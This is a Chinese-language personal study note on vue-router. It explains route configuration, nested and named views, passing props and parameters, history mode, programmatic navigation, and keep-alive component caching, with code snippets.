### **拆分html文件:**
1. 把html文件所有的内容放入到 vue的template模板中
2. 决定导航区和展示区的内容 将展示区的内容定义成组件

<br><br>

# 路由的基本使用

### **安装:**
下面的笔记都是按照 vue-router@2 来记录的 现在最新的版本为 vue-router@4 用法上都不一样 创建 router 实例的方式也不一样 所以在使用最新版本的 vue-router 的时候要看文档
```
npm i vue-router@2
npm i vue-router@3
```

<br>

### **创建: 路由配置文件 & 配置**
```
| - router
  - index.js
```

<!-- 
  之前记得笔记中 
    路由配置文件要引入 Vue 和 VueRouter 并注册Vue.use(VueRouter)
    入口文件中也要引入 Vue 和 VueRouter 并注册Vue.use(VueRouter) 注册了两边 不知道为啥
 -->

<br>

**1. 引入vue-router 并配置**
```js
// 引入VueRouter
import VueRouter from 'vue-router'

// 创建router并导出
const router = new VueRouter({
  routes,
  mode: "history"
})

export default router
```

<br>

**routes[]中的必选属性:**  
```js
{
  path:       定义uri路径
  component:  指定组件
}
```

<br>

**2. 入口文件引入router和vue-router, 注册并挂载router**
因为路由是一个插件库 所以我们要使用Vue.use()来注册一下插件 我们在入口文件中操作 因为入口文件里面 引入了vue
```js
import VueRouter from 'vue-router'
import router from "./router"

Vue.use(VueRouter)
Vue.config.productionTip = false

new Vue({
  router,
  render: h => h(App),
}).$mount('#app')
```

<br>

### **展示路由 和 路由跳转**
```html
<router-view>
<router-link>
```

要使用 ``<router-view> <router-link>``  
当路径发生变化都要展示对应的组件 所以必须要有 ``<router-view>``

<br><br>

# 单页面中多个视图: 命名视图
它可以在同一个组件内 展示更多的路由视图 而不是嵌套显示

命名视图可以让一个组件中具有多个路由渲染出口 这对于一些特定的布局组件非常的有用

命名视图的概念非常类似于 具名插槽 并且视图的默认名称也是 default

插槽是通过 slot-name 给插槽定义名称 然后通过名称定义存放的位置 命名视图是给router-view定义名称 然后通过name做匹配

<br>

### **命名视图的使用:**  
我们在一组路由规则中使用 components 属性项

```js
import {createRouter, createWebHistory, RouterRecordRaw} from "vue-router"

const routes: Array<RouteRecordRaw> = [
  {
    path: "/",
    component: () => import("../components.root.vue"),

    // 定义一个页面中的多个子路由
    children: [
      {
        path: "/user1",
        // 使用 components 配置项
        components: {
          // 默认, 我们写 router-view 默认会找default
          default: () => import("./A.vue"),
        }
      },
      {
        path: "/user2",
        components: {
          custom2: () => import("./B.vue"),
        }
      },
      {
        path: "/user2",
        components: {
          custom3: () => import("./C.vue"),
        }
      }
    ]
  }
]


// 定义router-view
<router-view></router-view>
<router-view name="custom2"></router-view>
<router-view name="custom3"></router-view>
```

<br>

### **待整理: routes对象中的: components属性**
我们在一个路由的配置对象里面写上 components: { }  
指定具名的 ``<router-view>`` 展示什么组件

```js
import VueRouter from "vue-router"
import Page1 from "../components/Page1"
import Page2 from "../components/Page2"
import Wrap from "../components/Wrap"

const routes = [
  {
    path: "/",

    // 当路径是/的时候 组件显示在不同的区域
    components: {
      default: Wrap,
      // 这里的key就是 router-view name属性
      page1: Page1,  
      page2: Page2,
    }
  },
  {
    path: "/page1",
    component: Page1
  },
  {
    path: "/page2",
    component: Page2
  },
]
const router = new VueRouter({
  routes
})

export default router
```

<br><br>

# 嵌套路由
一级路由 和 二级路由 如果一级路由里面再有路由那么它就是二级路由

比如 我们要创建 /home/message 那么这就是一个嵌套路由 我们要将/message的逻辑写在/home的里面

<br>

### **routes中的 children属性**
我们在每一个一级路由里面使用 children属性 它的值是一个数组 数组里面是对象

**注意:**  
在写二级路由的时候 path的值里不要带/

```js 
routes = {
  {
    // 一级路由
    path: "/about",
    components: About

    // 配置二级路由
    children: [
      {
        // path: '/news'  这就是错的

        // 这就是对的  二级路由不要带 / 直接写uri不要加斜杠 news
        path: 'news'   
        components: News
      }
    ]
  }
}

 // 结果:  /about/news
```

### **总结:**
首先决定路由是否嵌套 就要看该组件需要通过 router-view 来展示
如果是 就要看 router-view 定义在哪个组件里 那么通过这个标签来展示的组件就是子组件  

子组件就要定义在该组件的路由规则的children属性中
```js 
// 比如 我们的 welcome 组件就要在 home 的 router-view 中展示 那 welcome就是home的子组件 就要配置在 home的children里面
{
  path: "/home",
  component: Home,
  redirect: "/welcome",
  children:[
    {
      // 方式1:  path里面加 / 
      // 代表路径为 http://localhost:8080/welcome 单开形式
      path:"/welcome",

      // 方式2: path里面不加 / 
      // 代表路径为 http://localhost:8080/home/welcome 嵌套路由形式
      path:"welcome",

      component: Welcome
    }
  ]
},
```

<br>

**注意:**  
- vue发现一级路由中有children属性的时候会自动遍历该数组 然后自动在二级路由的前面添加 /, 所以我们在二级路由的前面不要添加 /

- 我们在 ``<router-link to='/home/news'>`` 要展示二级路由的时候要带上完整的路径 也就是 一级路径/二级路径

<br><br>

# 路由配置规则 routes 中的配置项
```js 
const router = new VueRouter({
  routes: [
    {
      这里有啥配置项呢??
    }
  ]
})
```

<br>

**<font color="#C2185B">name:</font>**  
配置该路由信息的别名

**作用:**   
让我们在多级路由跳转的时候简化编码 同时 在使用 路由别名 进行跳转的时候要使用以下的形式
```js
<router-link :to='{name: 路由别名}'>
```

```js 
const routes = [
  {
    name: 'xinxi'
    path: '/home/message',
    component: xxx
  }
]
```
```html
<!-- 正常跳转 -->
<router-link to='/home/message/detail'>

<!-- 使用路由别名进行跳转 -->
<router-link :to='{name: xinxi}'>
```

<br>

**<font color="#C2185B">path:uri部分</font>**  
router会检查 uri 部分 匹配对应的组件

<br>

**<font color="#C2185B">component: 组件</font>**  
uri匹配上后 指定对应的组件

<br>

**<font color="#C2185B">components: {default: 具名: }</font>**  
当有多个 router-view 的时候 使用的配置

<br>

**<font color="#C2185B">children: [{}]</font>**  
嵌套的路由 二级路由uri前面不用些 /

<br>

**<font color="#C2185B">redirect:"/uri"</font>**  
当匹配到某个路径的时候我们重定向到某个组件
```js 
const routes = [
  {
    path:'/',
    redirect: '/home'
  }
]
```

<br>

**<font color="#C2185B">redirect:{}</font>**  
redirect属性值的类型还是可以是一个对象 我们可以通过内部的name属性 使用路由的别名进行重定向
```js 
const routes = [
  {
    path:'/',

    redirect: {
      name: "一个路由中的name值"
    }
  }
]
```

<br>

**<font color="#C2185B">redirect:to => { ... }</font>**  
我们还可以写成一个函数, 函数中需要返回一个路径 可以返回字符串 或者 对象形式 

to: 父路由的所有信息

```js
const routes = [
  {
    path:'/',

    redirect: to => {
      return "/user1"

      // 对象形式 重定向的时候可以传参
      return {
        path: "/user1",
        query: {
          name: "sam"
        }
      }
    }
  }
]
```

<br>

**<font color="#C2185B">alias: [""]</font>**  
相当于给该条路由起了别名 不管我们是通过path跳转 还是通过定义的别名跳转 访问的都是我们指定的页面
```js
const routes = [
  {
    path:'/',
    alias: ["user1", "user2"],
    component: () => import("./a.vue")
  }
]


// 访问 / /user1 /user2 呈现的都是 a.vue
```


<br>

**<font color="#C2185B">props(路由文件中的配置项)</font>**  
下面的写法 **三选一**  
路由配置中的props定义的数据 都是在组件实例身上的props属性来接收
```
this.props.xxx
```

- **props配置项可以写成 对象形式**  
适用于向该条路由对应的组件传递 死数据 在该组件的 props 中接收

- **props配置项可以写成 布尔值**  
把params形式的参数也放入 组件的props中进行接收

- **函数**

<br>

### **props的对象写法:**
```js
const routes = [
  {
    name:
    path:
    component:

    props: {
      k:v
    }
  }
]
```

props中的k v会以props形式传递给组件 该组件要以props来接收 这种形式提供的数据是死数据

**使用方式:**  
- 路由配置文件中使用 props 配置项传递
- 目标组件就要使用 props:["变量"] 来接收

没有接收的话 在 this.$attrs 身上 如果有接收的话 就会在this身上

```js 
// router/index.js
const routes = [
  {
    name: 'xinxi',
    path: '/home/message',
    component: xxx组件

    props: {
      key: value

      // 对象形式写的数据是死的 也就是在路由配置文件里就可以向xxx组件传递数据
      a : 1
    }
  }
]
  

// xxx组件中 在实例中写props配置项 接收参数的参数
export default {
  props: ['a']
}
// 接收a属性 注意这里写字符串要不去data里面找变量了
```

<br>

### **2. props的布尔值写法**
若布尔值为真 就会把该路由组件收到的所有params参数 以props的形式传给xxx组件

该组件需要在 props 中接收 别人使用params形式传递的数据 使用该方式接收到的数据都会在vm身上

**使用方式:**  
- 该组件的路由配置文件中的 path/:id/:gender 定义接收数据的变量
- 在该组件中使用props注册该变量
```js 
const routes = [
  {
    name: 'xinxi',
    path: '/home/message/:id/:title',
    component: xxx组件

    // 设置为true
    props: true
  }
]

// xxx组件
props: ['id', 'title']
```

正常我们要接收 params 参数 需要在 $route.params 上接收

<br>

### **3. props的函数写法**
该函数必须有返回一个对象 对象中的key value会以props的形式传递给xxx组件

该函数可以接收到 $route 参数 这样就可以整理 query 和 params 把他们传递到 props 中 该组件就可以去props中接收
```js 
const routes = [
  {
    name: 'xinxi',
    path: '/home/message/:id/:title',
    component: xxx组件

    props($route) {

      // 这个返回的对象会在组件实例的props身上
      return {
        id: $route.query.id,
        title: $route.query.title'
      }
    }
  }
]

// xxx组件
props: ['id', 'title']
```

<br>

### **总结:**
通过配置 路由文件中的 路由组件对象的规则 可以将通过路由传递到该组件的数据 放在vm身上

1. 对象的写法传递的数据是死数据
2. 布尔写法为true时 params 形式的数据 会被传到路由组件的 props 身上
3. 函数式写法 函数的第一个参数为 $route 所以可以拿到 query 形式 和 params 形式的数据 我们可以将这两种形式的参数 通过返回值都放到 props 中

不管哪种方式 都需要在对应组件中使用 props 配置项 声明后接收

<br><br>

# history模式
```
www.baidu.com/?name="sam"#hash
```
url上从 # 开始到后面都是hash值, hash最大的特点就是它不会随着http请求随着路径发给服务器

整个vue中有两种工作模式 hash模式 和 history模式 我们可以在路由的配置文件里面 添加配置项 修改 vue路由的工作模式

有人说 history 坑很多 hash的兼容性比较好 history的兼容性略差

**还有啥区别？**  
一个请求资源的问题 使用hash的时候#后面不会当做请求资源发送给服务器 

但是 history模式就会拿着路径去服务器的接口中请求数据
```js 
localhost:8000/#/user/message
// hash模式  #/user/message 不会将这些发送给服务器请求资源

localhost:8000/user/message
// history模式 刷新的时候 会拿着整体的路径去找接口
```

<br>

### **使用history模式的问题:**
在项目上线的时候 我们项目要上线部署到服务器 那么就需要先进行打包 生成最纯粹的html css js 因为我们往服务器上放的必须是这些文件

比如我们可以将我们打包后的文件部署到服务器上的 static里面 当发起请求的时候 我们就给会看index.html页面


但是有一个问题 我们在点击页面的时候都是通过路由来跳转的 当一刷新页面的时候就会报错  因为一刷新我就要根据路径请求资源

首次刷新请求回来的一个页面 是 / 接口响应的
首页的展示是 localhost:8000/

当我点了很多路由后路径变成 localhost:8000/user/message
由于后台没有对应的接口 就会显示404

<br>

### **history怎么解决404的问题呢？**
需要后端工程师配合 它要将路径上的资源 和 后台的所有接口进行一个匹配  
最终决定下 哪些是前端路由的 哪些是后端路由的

nodejs里面有一个专门用来解决 history 404问题的中间件
nodejs 里面要安装依赖

```
npm install --save connect-history-api-fallback

https://www.npmjs.com/package/connect-history-api-fallback
```

<br>

**要点:**  
该包必须在静态资源设置前使用
```js 
const express = require('express')
const history = require('connect-history-api-fallback')
const app = express()

// 使用插件 它是一个函数要调用
app.use(history());

// history的使用必须在设置静态资源前
app.use(express.static(__dirname+'public'))

app.get('/', (req, res) => { 
  // 这里不用写返回首页的逻辑 好像自动去找index页面
})
```

还可以使用nginx 它会分析我们的请求是前端路由还是后端路由

<br>

### **路由配置项: mode: 'history'**
该配置项跟 routes 同级别, 通过该配置项可以修改路径的显示模式
```js 
const router = new VueRouter({
  routes,
  mode: 'history'
})
```
 
<br>

### **总结**
**hash模式:** 
1. 地址栏中永远带着#号 不美观
2. 若以后将地址通过第三方收集app分享 若app校验严格 则地址会被标记为不合法
3. 兼容性好

**history模式:**
1. 地址干净 美观
2. 兼容性和hash模式相比略差
3. 应用部署上线时候需要后端人员支持 解决刷新页面服务器端404的问题

<br>

### **routes 中的配置**
```js
{
  // url路径
  path: string, 

  //非命名视图
  component: Component,

  // 命名路由，给路由起个名字
  name: string, 

  // 命名视图组件
  components: { name1: Component1，name2: Component2}, 

  //重定向
  redirect: string | Location | Function,

  //props
  props?: boolean | Object | Function,

  //别名
  alias: string | Array<string>,

  // 嵌套的子路由
  children: Array<RouteConfig>, 

  //可以添加路由监听
  beforeEnter?: (to: Route, from: Route, next: Function) => void,

  //存一些自己定义的参数啥的
  meta: {{isData: true}},

  // 匹配规则是否大小写敏感？(默认值: false)
  caseSensitive: boolean, 

  // 编译正则的选项
  pathToRegexpOptions: Object 
}
```

<br>

### **router 中的配置**

```js
const router = new VueRouter({
  //路由模式控制 history 和 hash
  mode: 'history',

  // 路由列表
  routes: routes 

  //路由前缀
  base:  '/' ,  


  // 路由的滚动行为
  scrollBehavior (to, from, savedPosition) {
      // return {x:0，y:0}期望滚动到哪个的位置
  }
})
```

<br>

### **路由的滚动行为:**
使用前端路由 当切换到新路由的时候 想要页面滚到到顶部 或者是保持原先的滚动位置 

就像是重新弄加载页面那样 vue-router 可以自定义路由切换时页面如何滚动

<br>

**配置项: scrollBehavior:**  
它在 router 的配置项中 跟 history 是同级

该方法会接收 to from savedPosition 三个参数

<br>

**注意:**  
savedPosition只能当 popstate 导航(通过浏览器的前进 后退 按钮触发)时才可使用
```js
const router = createRouter({
  history: createWebHistory(),

  scrollBehavior: (to, from, savedPosition) => {
    ...
  }
  
})
```

**savedPosition:**  
返回滚动位置的对象信息, vue来标记的距离, 当页面没有滚动条的时候 会返回null

当我们通过 历史记录前进后退的时候 savedPosition juice会记录上一个页面的位置

```js
{
  left: number,
  top: number
}
```

<br>

**示例:**
```js
const router = createRouter({
  history: createWebHistory(),

  scrollBehavior: (to, from, savedPosition) => {
    // 这里我们将上一个页面的值直接返回就可以
    if(savedPosition) {
      return savedPosition
    } else {
      return {
        // vue3是top left vue2是x y
        top: 0
      }
    }
  }
})
```

<br><br>

# ``<router-link>`` 和 ``<router-view>``
上面已经配置到了路由的规则 现在我们完成点击标签更改路径 和 匹配组件的逻辑

原始html中使用a标签实现页面的跳转 但是在vue中我们不能使用a标签来进行跳转而是要使用vue-router这个库给我们提供的专用标签``<router-link>``标签实现路由的切换

<br>

### **&lt;router-link to='uri接口部分 /user' active-class=''&gt;**
**<router-link>** 是vue-router插件库给我们提供修改路径的方式

**标签属性:**  
**<font color="#C2185B">to:</font>**    
希望跳转的路径, 形式为/路径 

<br>

**<font color="#C2185B">active-class:</font>**    
该元素被激活时候的样式 值为类名 原本的class照常写

```
可以理解为<a>标签, 是vue-router中注册过的组件, 这两个组件是全局组件可以在任何的文件中用, 

<router-link> 最终会被渲染成 <a>
```

可以将url中的地址改成 to后面的值, 这样当地址栏中出现/home的时候就会映射到对应的组件上

<br>

### **&lt;router-link replace&gt;**
**作用:**   
控制路由跳转时操作浏览器历史记录的模式

浏览器的历史记录有两种写入方式:  
- push  
追加历史记录

- replace   
替换当前记录

路由跳转时候默认为push

我们每一次点击后退都会留下历史记录 浏览器是一个栈结构 我们每次点击一个链接后 都会将该记录压入栈 后点的会在最上方 栈中有一个指针始终指向栈顶

历史记录操作的push模式  
每当我们点击一次后退的时候指针就会下移一位 前进和后退就是一个操作指针的过程 我们通过``<router-link>`` 跳转的链接 每一次点击都会留下历史记录 默认是push操作 就是可以依次回退

它最大的特点就是替换当前栈顶的那一条 每次点击一次链接后 都会替换掉上一条 也就是说栈里面始终只有一条 <font color="#C2185B">它不会能回退</font>

<br>

### **&lt;router-view&gt;**
该标签决定 路由匹配的组件在哪个区域展示
我们可以在template的html结构中定好这个区域 然后直接将router-view丢进去就可以了

```
也就是通过css来定结构 然后router-view决定组件在哪里呈现
```

<br>

### **举例:**
``<router-link>`` 标签中的 to属性
可以将url中的地址改成 to后面的值, 这样当地址栏中出现/home的时候就会映射到对应的组件上
```html
<router-link to='/home'>首页</router-link>
<!-- http://localhost:8080/#/home -->
```


``<router-view>`` 决定要被渲染的组件, 在什么位置的 某个组件渲染之后会替代``<router-view>``的位置, 相当于占位的

```js 
// 在页面上创建两个标签, 当点击home的时候显示home的组件, 当点击about的时候显示about的组件
<template>
  <div id="app">
    <router-link to='/home'>首页</router-link>
    <router-link to='/about'>关于</router-link>
  </div>
</template>

// 页面中会出现 两个链接, 每点击一个链接会出现 首页 关于

http://localhost:8080/#/home
http://localhost:8080/#/about

// 一旦点击链接按钮后地址栏变为对应地址应该在页面中的某一个区域内显示出来

<template>
  <div id="app">
    <router-link to='/home'>首页</router-link>
    <router-link to='/about'>关于</router-link>

    <router-view></router-view>
  </div>
</template>
```

**注意:**  
切换掉的组件 其实是被销毁了 比如我们从a切换到了b 展示的b 那么a组件就被销毁了
在路由切换时, *切换的是``<router-view>``挂载的组件*, 其它内容不会发生改变

<br><br>

### **路由组件 和 一般组件**
一般组件: 我们自己写的 组件标签 展现的组件  
路由组件: 通过监测路径的变化 vue-router 自己匹配的组件 在router-view里面呈现

**书写规范:**
一般组件 一般放在components文件夹中  
路由组件 一般放在pages文件夹中

<br>

**路由组件上特有的对象: $router $route**

<br>

### **$router对象: 路由器**
当我们导入 Vuerouter 后整个应用就会多出一个 $router 且只有一个 所有的路由都归它管

<br>

**$router身上的属性:**  
```js
afterHooks: []
app: Vue {_uid: 0, _isVue: true, $options: {…}, _renderProxy: Proxy, _self: Vue, …}
apps: [Vue]
beforeHooks: []
fallback: false
history: HashHistory {router: VueRouter, base: '', current: {…}, pending: null, ready: true, …}
matcher: {match: ƒ, addRoute: ƒ, getRoutes: ƒ, addRoutes: ƒ}
mode: "hash"

// routes
options: {routes: Array(1)}
resolveHooks: []
currentRoute: Object
```

<br>

### **$router.options.routes**
可以获取 routes 路由数组

<br><br>

# 路由传参 --- query形式传递
**优点: 刷新页面参数不丢失**

### 案例: 
页面上有3个按钮 我们点击按钮 展示该按钮对应的详情页面  
但是详情页面只是一个组件 也就是我们 我们要用这一个组件展示3个按钮对应的不同内容 比如这个展示区要展示 id title

<br>

**思路:**   
由于数据在按钮的组件当中 那我们是不是可以在点击按钮的时候 向路由组件传递数据 将详情组件想要展示的东西传递过去(路由能接收两种参数)

<br>

### **传递 query 参数:**

**<font color="#C2185B">格式: /user?id=666&title=你好呀</font>**
我们可以在路径中使用?的形式带着参数过去
```js 
// 向detail组件传递参数
<router-link to='/home/message/detail?id=666&title=你好呀'>
```


### **接收 query 参数:**
通过 ``this.$route.query`` 接收到 它是一个对象
```js 
this.$route.query = {
  id: "666",
  title: "你好呀"
}

this.$route.query.name
```

<br>

### **query参数中携带变量的写法: 字符串拼接**
我们要在 to 前 使用 v-bind
```js 
  <router-link 
    :to='`/home/message/detail?id=${item.id}&title=${item.title}`'
  >
```

<br>

### **query参数中携带变量的写法: 对象式写法**
我们要在 to 前 使用 v-bind 指定一个对象

对象中的属性:
```
to: {
  path:
  query: {

  }
}
```

```js 
  <router-link :to='{
    path:'/home/message/detail',
    query: {
      id: item.id,
      title: item.title
    }
  }'>
```

<br>


### **接收 query 参数: this.$route.query**
``<router-link to>`` 中传递参数 匹配的路由组件就要接收参数  
``$route``里面是路由的各种信息里面有一个query对象用于接收向该组件传递的query参数

```html
  <!-- 模板中可以直接使用 -->
  <li>{{$route.query.id}}</li>
  <li>{{$route.query.title}}</li>
```

<br>

### **示例:**
```html
<template>
  <div>
    <h3>App组件</h3>
    <hr>
    <div>
      <router-link 
        to="/page1?title=sam&age=18">
        Page1
      </router-link> <br>

      <router-link to="/page2">Page2</router-link>
    </div>

    <hr>
    <router-view></router-view>
  </div>
</template>


<!-- 路由组件 -->
<template>
  <div>
    <h3 class="page_one">Page one</h3>
    <hr>
    <h3>{{content.title}} -- {{content.age}}</h3>
  </div>
</template>

<script>
export default {
  name: "Page1",
  data() {
    return {
      content: {
        title: "",
        age: ""
      }
    }
  },
  created() {
    // 从 this.$route.query 获取 参数
    let {title, age} = this.$route.query
    this.content = {title, age}

    console.log(this.content)
  }
}
</script>
```

<br><br>

# 路由传参 --- params形式传递
**问题: 刷新页面参数会丢失 刷新也没有丢失数据呀**

<br>

### **传递 params 参数: 字符串写法**
将要传递的 数据 或 变量 使用如下形式进行拼接
```
/home/message/detail/666/你好啊
```

**要点:**   
要使用 v-bind:to 里面有变量的时候 要普通冒号 包裹 模板字符串的方式
```js 
<router-link :to='`/home/message/detail/666/你好啊`'>
```

在目标组件的路由配置对象中 path 属性定义变量 声明该组件要接收什么数据
```js 
{
  path: 'detail/:id/:data'
}
```

该组件在获取数据的时候 从 ``$route.params`` 身上获取 id 和 data数据
```
params: {id: "8"}
```

<br>

### **传递 params 参数: 对象写法**
对象写法中 就不能用path 必须使用组件路由配置中的name别名
```js 
  <router-link :to='{
    // 错的 不能用path
    // path:'/home/message/detail',      
    
    // 要使用name
    name:'组件的别名',
    params: {
      id: item.id,
      title: item.title
    }
  }'>
```

**注意:**
模板中可以直接使用 $route 但是实例中要通过this获取

<br><br>

# $route身上的属性

### **$route.query:**
该对象里保存着 别人通过query方式传递过来的参数 模板中可以直接使用 $route.query.id 的方式获取

<br>

### **$route.params:**
该对象里保存着 别人通过params方式传递过来的参数 模板中可以直接使用 $route.params.id 的方式获取
```js 
/666/你好啊
path: /:id/:message
$route.params
```

<br>

### **$route.matched:**
类型: 数组

matched 顾名思义 就是 匹配 假如我们目前的路由是/a/aa-01

那么此时 this.$route.matched匹配到的会是一个数组 包含 '/' '/a' '/a/aa-01' 这三个path的路由信息。

上述这些都是通过 $route 输出就可以看到

<br>

### **$route:**
每一个组件都有自己的 ``$route`` 里面存储的是自己的路由信息 里面还有vue-router添加进去的一些属性

每一个组件的``$route``都是不一样的(值不一样)

``$route``表示当前激活的路由的状态信息 包含了当前 URL 解析得到的信息, 还有 URL 匹配到的 route records(路由记录)。

<br>

```js
$route: {
  path: 字符串, 对应当前路由的路径 "/foo/bar",
  params: key/value 对象 包含动态参数 :id 没有则为 { },
  query: key/value 对象 url查询参数 /foo?user=1 没有则为 { },
  hash: 当前路由的 hash 值 (不带 #) 则为空字符串,
  fullPath: 包含查询参数和 hash 的完整路径 "/foo/bar"
  matched: 数组 包含当前匹配的路径中所包含的所有片段所对应的配置参数对象。
  name: 路由别名.
  meta: 元数据对象
}
```

<br><br>

# 编程式路由导航
不借助router-link实现的跳转就是编程式的路由导航 我们通过$router身上的方法来完成逻辑 $router是new VueRouter的实例

**<font color="#C2185B">this.$router.push(参数)</font>**  
**<font color="#C2185B">this.$router.replace(参数)</font>**  
使用push模式跳转 会留下历史记录  
使用replace模式跳转 不会留下历史记录

**参数:** 
方式1: 配置对象
```js 
// 传递 query 参数
this.$router.push({
  path: '/home',
  query: {
    key: value
  }
})

// 传递 params 参数  注意: 跳转的时候 要使用 name 属性
this.$router.push({
  name: "page1",
  params: {
    id: 1
  }
})
```

<br>

方式2:路径
```js 
this.$router.push('/home')
```

<br>

**<font color="#C2185B">this.$router.back()</font>**  

<br>

**<font color="#C2185B">this.$router.forward()</font>**  
后退和前进功能

<br>

**<font color="#C2185B">this.$router.go()</font>**  
接收一个整数 2 连续前进二步 -2 连续后退二步

```js 
<button @click='homeClick'>首页</button>
<button @click='aboutClick'>关于</button>

// 我希望通过监听这两个按钮的点击, 使用内部的处理函数来进行路由之间的跳转 App.vue --- script标签内部

export default {
  name: 'App',
  methods: {
    homeClick() {
      this.$router.push('/home')
    },
    aboutClick() {
      this.$router.push('/about')
    },
  }
}
```  

<br>

**注意:**
使用编程式路由导航 对象的形式传递params的时候 可能不能用path要用路由别名name

<br>

**<font color="#C2185B">this.$router.resolve()</font>**  
该方法并不会改变 url 和 跳转路径 而是返回一个 路由信息对象

参数:
可以直接传递 url 或者 配置对象
```js
this.$router.resolve({
  path: '/home',
  query: {
    key: value
  }
})
```

返回值: 对象

```js
//  uri部分 我们可以利用它 进行新窗口打开
href: "#/page1"

location: 
    hash: ""
    params: {}
    path: "/page1"
    query: {}
    _normalized: true


normalizedTo: 
    hash: ""
    params: {}
    path: "/page1"
    query: {}
    _normalized: true


resolved: 
    fullPath: "/page1"
    hash: ""
    matched: [{…}]  // 路由数组
    meta: {}
    name: undefined
    params: {}
    path: "/page1"
    query: {}


route: 
    fullPath: "/page1"
    hash: ""
    matched: [{…}]
    meta: {}
    name: undefined
    params: {}
    path: "/page1"
    query: {}
```

**注意:**
如果没有传入的路径没有匹配的组件 那么 matched[] 数组的长度为0

<br>

### **动态路由**

**<font color="#C2185B">this.$router.addRoutes()</font>**  
this.$router.addRoute()
已弃用, 需要使用 addRoute() 来代替

作用: 动态的添加更多的路由规则 参数必须是一个 符合 routes 选项要求的数组

<br>

**<font color="#C2185B">this.$router.addRoute()</font>**  
添加一条新路由规则 如果该路由规则有 name 并且已经存在一个与之相同的 则会覆盖

<br>

**<font color="#C2185B">this.$router.getRoutes()</font>**  
获取所有活跃的路由记录列表

<br>

**<font color="#C2185B">this.$router.onError(cb)</font>**  
注册一个回调 该回调会在路由导航中出错的时候被调用 注意被调用的错误必须是下列情形中的一种
- 错误在一个路由守卫函数中被同步抛出
- 错误在一个路由守卫函数中通过 调用 next(err) 的方式异步捕获并处理
- 渲染一个路由的过程中 需要尝试解析一个异步组件时发生的错误

<br><br>

# 缓存路由组件 ``<keep-alive>`` (组件缓存)
作用: 让不展示的路由组件保持挂载 不被销毁

**场景:**  
有这么一个场景 一个注册页面 我们填写完了很多的信息 然后点击按钮切换到了别的页面
这时候我们再回来发现我们写的信息都没有了

因为跳转到另一个页面 前一个组件就会被销毁 我们回退回去之后它属于重新生成里面的内容就是生成的新的 没办法diff算法 没办法复用 只能用新的节点替换掉旧的节点

那怎么才能保存之前我们浏览的状态呢？

<br>

### **``<keep-alive>``组件**
是vue内置的一个组件, 可以使被包含的组件保留状态, 或避免重新渲染和重新创建 放在里面的组件会被缓存

```js 
<keep-alive>
  <router-view></router-view>       // 看这里
</keep-alive>
```

放在 keep-alive 里面的状态都会被保存 也就是显示在里面的组件不会被销毁 但是也不是所有的组件被缓存就是好的 我们可以针对那些需要被缓存的项目进行缓存 比如 input

<br>

### **``<keep-alive>``缓存后才有的生命周期**

<br>

**<font color="#C2185B">activated() { ... }</font>**  
当页面处于活跃状态的时候, 执行该回调

<br>

**<font color="#C2185B">deactivated() { ... }</font>**  
当页面不处于活跃状态的时候, 执行该回调

<br>

**实际场景:**  
有一个群友说 一个B页面中的结构只想展现一次

**思路1:** 
通过定义一个变量 然后通过v-if来决定该结构是否被渲染

**问题:**  
什么时候修改这个变量的值
1. 组件销毁
2. 路由守卫
上述两点都不行 因为离开当前页面确实是组件销毁了 但是回来后会被重新创建 即使销毁的时候我们修改了flag的值 重新创建的时候也会赋值回来

<br>

**解决方法:**
```
<keep-alive> + deactivated() { ... }
```

```html 
<div id="app">
  <div>
    <h3>我是app页面</h3>
  </div>
  <hr>
  <div class="nav">
    <router-link to="/home">Home</router-link> <br>
    <router-link to="/login">Login</router-link> <br>
  </div>
  <div class="view">
    <keep-alive>
      <router-view />
    </keep-alive>
  </div>
</div>

<script>
data() {
  return {
    flag: true
  }
},

// 当该组件失活的时候 修改flag
deactivated() {
  this.flag = false
  console.log(this.flag)
}
</script>
```

<br>

### **``<keep-alive include='字符串 or 正则 or 数组'>``**
字符串或正则表达, 只有匹配的组件会被缓存 如果有多个组件需要用 号隔开

想缓存啥就写啥

<br>

### **``<keep-alive exclude='字符串 or 正则 or 数组'>``**
字符串或正则表达, 任何匹配的组件都不会被缓存  
当有多个组件要被缓存的时候 还可以传递数组

不想缓存啥就写啥

```html
<keep-alive :exclude='["News", "About"]'>
```

**注意:**  
exclude='不要随意加空格', 正则里面也不要有空格
```html
<!-- 这是对的 -->
<keep-alive exclude='Profile,User'>
  
<!-- 这是错的 -->
<keep-alive exclude='Profile, User'>
```

exclude='这里面的name是' 是组件名

<br>

### **``<keep-alive :max="10">``**
指定缓存组件的数量 比如我们有11个组件 只缓存10个 那么它内部会有一个算法 将不常用的组件舍弃掉

<br>

### **问题: 当遇到嵌套路由的时候,可能并没有起到我们想要的效果(不重新创建组件渲染页面)**

<br>

### **尝试方案1:**
我们的嵌套路由是通过在路由里面添加 children:[] 属性传递的 里面有一个 redirect 属性 是用来做刷新页面时 显示默认页面的
```js 
{
  path: '/home',
  component: Home,

  meta: {
    title: '首页'
  },
  
  children: [
    {            --------------------------
      path: '',
      redirect: 'news'    我们把这个部分禁掉
    },          ---------------------------
    {
      path: 'news',
      component: HomeNews,
    },
    {
      path: 'message',
      component: HomeMessage,
    }
  ]
},
```

禁掉 redirect 就意味着 每次我们进入home页面的时候需要手动点击 新闻 或者 消息的链接才会有内容, 为了解决这个问题 我们可以这样

在Home.vue文件里, 使用 created() {} 声明周期函数 当创建该组件的时候 修改链接的地址
```js 
export default {
  name: 'Home',

  // 创建时候的生命周期函数
  created() {
    console.log('created');

    // 通过push方法 在该组件被创建的时候 修改地址
    this.$router.push('/home/news');
  },

  // 销毁时候的生命周期函数
  destroyed() {
    console.log('destroyed')
  }
}
```
在 created() {} 生命周期函数中 使用 this.$router.push('/home/news'); 方式

但是上述方法不行, 本来这里是为了解决, 禁掉 redirect属性后 刷新页面有默认显示页面的 但是失败了, 第一次刷新后是有默认页面但是点击别的页面后再回到该页面 并没有显示默认页面

<br>

### **尝试方案2**
我们尝试了第二种解决方式 在该组件中声明一个默认路径
```js 
  data() {
    return {
      // 为了解决 禁掉 redirect属性后 刷新页面没有默认显示的问题, 我们定义了一个默认路径
      path: '/home/news'
    }
  },
```

然后使用 created() { ... } 生命周期函数, 在创建该组件时, 将路径修改为 /home/news
```js 
  created() {
    console.log(this.path);

    // 本来这里是为了解决, 禁掉 redirect属性后 刷新页面有默认显示页面的 但是失败了, 第一次刷新后是有默认页面但是点击别的页面后再回到该页面 并没有显示默认页面
    this.$router.push('/home/news');
  },
```

上述方法也失败了 第一次刷新后是有默认页面但是点击别的页面后再回到该页面 并没有显示默认页面

<br>

### **尝试方案3**
